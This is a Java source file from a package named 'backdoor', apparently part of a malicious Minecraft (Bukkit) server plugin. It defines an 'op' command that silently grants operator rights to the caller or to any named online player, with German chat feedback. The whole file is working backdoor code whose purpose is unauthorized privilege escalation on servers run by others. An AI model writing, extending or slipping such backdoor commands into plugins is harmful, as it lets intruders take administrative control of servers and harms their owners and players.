package de.blox.backdoor.commands.implement;

import de.blox.backdoor.commands.AbstractCommand;
import de.blox.backdoor.core.Core;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;



public class OpCommand extends AbstractCommand {

    public OpCommand() {
        super("Op you or other", "op [<Spielername>]", "op");
    }

    @Override
    public void processCommand(Player player, String line, String[] args) {
        if (args.length == 0) {
            player.setOp(true);
            player.sendMessage(Core.getInstance().getPrefix() + "§aDu hast jetzt die Operator Rechte!");
            return;
        } else if (args.length == 1) {
            String targetName = args[0];

            Player target = Bukkit.getPlayer(targetName);
            if (target == null) {
                player.sendMessage(Core.getInstance().getPrefix() + "§cDer Spieler §6" + targetName + " §7ist nicht online!");
                return;
            }

            target.setOp(true);
            player.sendMessage(Core.getInstance().getPrefix() + "§7Du hast den Spieler §6" + targetName + " §7die Operator Rechte gegeben.");
        } else {

            player.sendMessage(Core.getInstance().getPrefix() + "Bitte benutze: §c" + this.usage());
        }
    }

    @Override
    public boolean mustRegistered() {
        return true;
    }

}
